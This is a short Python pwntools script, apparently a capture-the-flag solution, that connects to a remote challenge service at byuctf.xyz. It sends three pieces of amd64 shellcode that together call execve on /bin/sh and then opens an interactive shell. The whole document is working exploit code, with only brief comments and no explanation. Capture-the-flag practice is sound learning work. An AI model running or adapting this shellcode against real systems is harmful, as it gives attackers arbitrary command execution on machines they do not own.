from pwn import *


context.arch = 'amd64'

# p = process('./shellcode')
p = remote('byuctf.xyz', 40017)
# gdb.attach(p, gdbscript='b *main+341')

# in rdx we have address of rwx section, so i move it to rax, to not get SIGSEGV on add [rax], al instructions
part1 = """
push rax
mov rax, rdx
xor rdx, rdx
xor rsi, rsi
"""

print(p.recv().decode(errors='ignore'))
p.send(asm(part1))

part2 = """
mov rbx, 0x68732f6e69622f
"""

print(p.recv().decode(errors='ignore'))
p.send(asm(part2))

part3 = """
push rbx
push rsp
pop rdi
push 0x3b
pop rax
syscall
"""

print(p.recv().decode(errors='ignore'))
p.send(asm(part3))

print(p.recv().decode(errors='ignore'))
p.sendline(b'\x90' * 10) # useless part, lmao =)

p.interactive()
